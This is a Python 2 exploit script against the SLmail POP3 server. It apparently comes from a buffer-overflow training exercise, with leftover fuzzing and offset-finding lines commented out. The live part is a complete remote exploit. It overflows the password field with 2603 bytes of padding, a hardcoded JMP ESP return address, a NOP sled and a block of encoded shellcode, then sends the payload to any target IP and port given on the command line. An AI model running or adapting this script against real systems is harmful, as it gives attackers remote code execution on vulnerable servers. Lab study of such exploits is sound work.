#!/usr/bin/python
import time, struct, sys
import socket as so

# Buff represents an array of buffers. This will be start at 100 and be incremented by 200 in order to attempt to crash SLmail.

#off = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
#7C941EED


buf =  ""
buf += "\xd9\xea\xd9\x74\x24\xf4\x5e\x33\xc9\xb8\xbe\x53\xfd"
buf += "\x16\xb1\x54\x83\xee\xfc\x31\x46\x14\x03\x46\xaa\xb1"
buf += "\x08\xea\x3a\xb7\xf3\x13\xba\xd8\x7a\xf6\x8b\xd8\x19"
buf += "\x72\xbb\xe8\x6a\xd6\x37\x82\x3f\xc3\xcc\xe6\x97\xe4"
buf += "\x65\x4c\xce\xcb\x76\xfd\x32\x4d\xf4\xfc\x66\xad\xc5"
buf += "\xce\x7a\xac\x02\x32\x76\xfc\xdb\x38\x25\x11\x68\x74"
buf += "\xf6\x9a\x22\x98\x7e\x7e\xf2\x9b\xaf\xd1\x89\xc5\x6f"
buf += "\xd3\x5e\x7e\x26\xcb\x83\xbb\xf0\x60\x77\x37\x03\xa1"
buf += "\x46\xb8\xa8\x8c\x67\x4b\xb0\xc9\x4f\xb4\xc7\x23\xac"
buf += "\x49\xd0\xf7\xcf\x95\x55\xec\x77\x5d\xcd\xc8\x86\xb2"
buf += "\x88\x9b\x84\x7f\xde\xc4\x88\x7e\x33\x7f\xb4\x0b\xb2"
buf += "\x50\x3d\x4f\x91\x74\x66\x0b\xb8\x2d\xc2\xfa\xc5\x2e"
buf += "\xad\xa3\x63\x24\x43\xb7\x19\x67\x0b\x74\x10\x98\xcb"
buf += "\x12\x23\xeb\xf9\xbd\x9f\x63\xb1\x36\x06\x73\xb6\x6c"
buf += "\xfe\xeb\x49\x8f\xff\x22\x8d\xdb\xaf\x5c\x24\x64\x24"
buf += "\x9d\xc9\xb1\xd1\x97\x5d\x30\x26\xa8\x7f\x2c\x24\xa8"
buf += "\x7f\xfd\xa1\x4e\x2f\xad\xe1\xde\x8f\x1d\x42\x8f\x67"
buf += "\x74\x4d\xf0\x97\x77\x87\x99\x3d\x98\x7e\xf1\xa9\x01"
buf += "\xdb\x89\x48\xcd\xf1\xf7\x4a\x45\xf0\x08\x04\xae\x71"
buf += "\x1b\x70\xcf\x79\xe3\x80\x7a\x7a\x89\x84\x2c\x2d\x25"
buf += "\x86\x09\x19\xea\x79\x7c\x19\xed\x85\x01\x28\x85\xb3"
buf += "\x97\x14\xf1\xbb\x77\x95\x01\xed\x1d\x95\x69\x49\x46"
buf += "\xc6\x8c\x96\x53\x7a\x1d\x02\x5c\x2b\xf1\x85\x34\xd1"
buf += "\x2c\xe1\x9a\x2a\x1b\x72\xdc\xd5\xd9\x56\x45\xbe\x21"
buf += "\xd6\x75\x3e\x48\xd6\x25\x56\x87\xf9\xca\x96\x68\xd0"
buf += "\x82\xbe\xe3\xb4\x61\x5e\xf3\x9d\x24\xfe\xf4\x11\xfd"
buf += "\x17\x7b\xd6\x02\x18\x7d\xeb\xd4\x21\x0b\x2c\xe5\x15"
buf += "\x04\x07\x48\x3f\x8f\x67\xde\x3f\x9a"


buff=["A"*2603 + '\xed\x1e\x94\x7c' + '\x90'*20 + buf] 
#"B"*100 ]

# Maximum size of buffer.

#max_buffer = 4000

# Initial counter value.

#counter = 100

# Value to increment per attempt.

#increment = 100


#while len(buff) <= max_buffer:
#    buff.append("A"*counter)
#    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s <ip> <port>" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash app at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.recv(1024)
        s.send("username" + '\r\n')
        s.recv(1024)
        s.send("password" + string + '\r\n')
        s.close()
     except: 
        print "[+] Connection failed at %s bytes. Make sure IP/port are correct, or check debugger for app crash." % len(string)
        sys.exit()
